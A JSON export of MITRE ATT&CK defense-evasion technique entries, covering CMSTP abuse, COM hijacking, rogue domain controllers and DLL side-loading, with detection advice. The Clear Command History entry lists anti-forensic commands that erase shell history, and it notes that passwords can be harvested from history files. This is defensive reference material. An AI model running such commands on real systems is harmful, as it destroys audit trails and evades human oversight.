Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.<\/p>\n<p>Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1117\">Regsvr32<\/a> \/ \u201dSquiblydoo\u201d, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and\/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.<\/p>\n<p>CMSTP.exe can also be abused to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1088\">Bypass User Account Control<\/a> and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":176,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":178,"name":"T1146 - Clear Command History","sort_id":0,"external_id":"T1146","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>macOS and Linux both keep track of the commands users type in their terminal so that users can easily remember what they've done. These logs can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE<\/code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~\/.bash_history<\/code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Since everything typed on the command-line is saved, passwords passed in on the command line are also saved. Adversaries can abuse this by searching these files for cleartext passwords. Additionally, adversaries can use a variety of methods to prevent their own commands from appear in these logs such as <code>unset HISTFILE<\/code>, <code>export HISTFILESIZE=0<\/code>, <code>history -c<\/code>, <code>rm ~\/.bash_history<\/code>.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":178,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":178,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":183,"name":"T1116 - Code Signing","sort_id":0,"external_id":"T1116","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)<\/p>\n<p>Code signing to verify software on first run can be used on modern Windows and macOS\/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)<\/p>\n<p>Code signing certificates may be used to bypass security policies that require signed code to execute on a system.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":183,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":183,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":187,"name":"T1500 - Compile After Delivery","sort_id":0,"external_id":"T1500","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1027\">Obfuscated Files or Information<\/a>, text-based source code files may subvert analysis and scrutiny from protections targeting executables\/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC\/MinGW.(Citation: ClearSky MuddyWater Nov 2018)<\/p>\n<p>Source code payloads may also be encrypted, encoded, and\/or embedded within other files, such as those delivered as a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1193\">Spearphishing Attachment<\/a>. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS\/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":187,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":187,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":187,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":188,"name":"T1223 - Compiled HTML File","sort_id":0,"external_id":"T1223","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting\/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)<\/p>\n<p>Adversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by <a href=\"https:\/\/attack.mitre.org\/techniques\/T1204\">User Execution<\/a>. CHM execution may also bypass application whitelisting on older and\/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":188,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":189,"name":"T1109 - Component Firmware","sort_id":0,"external_id":"T1109","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1019\">System Firmware<\/a> but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":189,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":190,"name":"T1122 - Component Object Model Hijacking","sort_id":0,"external_id":"T1122","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>The Component Object Model (COM) is a system within Windows to enable interaction between software components through the operating system. (Citation: Microsoft Component Object Model) Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. (Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":190,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":193,"name":"T1196 - Control Panel Items","sort_id":0,"external_id":"T1196","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)<\/p>\n<p>For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing CPL)<\/p>\n<p>Adversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1193\">Spearphishing Attachment<\/a> campaigns (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and\/or file extension whitelisting.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":193,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":201,"name":"T1207 - Rogue Domain Controller","sort_id":0,"external_id":"T1207","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.<\/p>\n<p>Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)<\/p>\n<p>This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform <a href=\"https:\/\/attack.mitre.org\/techniques\/T1178\">SID-History Injection<\/a> and\/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to\/from non DC hosts. (Citation: GitHub DCSYNCMonitor) (Citation: DCShadow Blog) DC replication will naturally take place every 15 minutes but can be triggered by an attacker or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). (Citation: DCShadow Blog)\n\nLeverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies. (Citation: Microsoft DirSync) (Citation: ADDSecurity DCShadow Feb 2018)\n\nBaseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects. (Citation: DCShadow Blog)\n\nInvestigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with \u201cGC\/\u201d) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235\u20134B06\u201311D1-AB04\u201300C04FC2DCD2) can be set without logging. (Citation: ADDSecurity DCShadow Feb 2018) A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":201,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":203,"name":"T1073 - DLL Side-Loading","sort_id":0,"external_id":"T1073","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: MSDN Manifests) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable to side-loading to load a malicious DLL. (Citation: Stewart 2014)<\/p>\n<p>Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":203,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":218,"name":"T1140 - Deobfuscate\/Decode Files or Information","sort_id":0,"external_id":"T1140","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use <a href=\"https:\/\/attack.mitre.org\/techniques\/T1027\">Obfuscated Files or Information<\/a> to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.<\/p>\n<p>One such example is use of <a href=\"https:\/\/attack.mitre.org\/software\/S0160\">certutil<\/a> to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy \/b<\/code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)<\/p>\n<p>Sometimes a user's action may be required to open it for deobfuscation or decryption as part of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1204\">User Execution<\/a>. The user may also be required to input a password to open a password protected compressed\/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https:\/\/attack.mitre.org\/software\/S0160).\n\nMonitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":218,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":218,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":218,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":219,"name":"T1089 - Disabling Security Tools","sort_id":0,"external_id":"T1089","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":219,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":219,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":219,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":232,"name":"T1480 - Execution Guardrails","sort_id":0,"external_id":"T1480","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary\u2019s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local\/external IP addresses.(Citation: FireEye Outlook Dec 2019)<\/p>\n<p>Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical <a href=\"https:\/\/attack.mitre.org\/techniques\/T1497\">Virtualization\/Sandbox Evasion<\/a>. While use of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1497\">Virtualization\/Sandbox Evasion<\/a> may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detecting the use of guardrails may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https:\/\/attack.mitre.org\/tactics\/TA0007), especially in a short period of time, may aid in detection.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":232,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":232,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":232,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":242,"name":"T1211 - Exploitation for Defense Evasion","sort_id":0,"external_id":"T1211","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.<\/p>\n<p>Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for <a href=\"https:\/\/attack.mitre.org\/techniques\/T1518\/001\">Security Software Discovery<\/a>. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Exploitation for defense evasion may happen shortly after the system has been compromised to prevent detection during later actions for for additional tools that may be brought in and used. Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. This could include suspicious files written to disk, evidence of [Process Injection](https:\/\/attack.mitre.org\/techniques\/T1055) for attempts to hide execution or evidence of Discovery.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":242,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":242,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":242,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":246,"name":"T1181 - Extra Window Memory Injection","sort_id":0,"external_id":"T1181","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input\/output of data). (Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of extra window memory (EWM) to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)<\/p>\n<p>Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.<\/p>\n<p>Execution granted through EWM injection may take place in the address space of a separate live process. Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\">Process Injection<\/a>, this may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. (Citation: Endgame Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":246,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":248,"name":"T1107 - File Deletion","sort_id":0,"external_id":"T1107","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.<\/p>\n<p>There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native <a href=\"https:\/\/attack.mitre.org\/software\/S0106\">cmd<\/a> functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":248,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":248,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":248,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":249,"name":"T1006 - Direct Volume Access","sort_id":0,"external_id":"T1006","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)<\/p>\n<p>Utilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives. (Citation: Github PowerSploit Ninjacopy)\n\nMonitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1086), additional logging of PowerShell scripts is recommended.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":249,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":252,"name":"T1222 - File and Directory Permissions Modification","sort_id":0,"external_id":"T1222","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may modify file or directory permissions\/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).<\/p>\n<p>Modifications may include changing specific access rights, which may require taking ownership of a file or directory and\/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1546\/008\">Accessibility Features<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1037\">Boot or Logon Initialization Scripts<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1546\/004\">.bash_profile and .bashrc<\/a>, 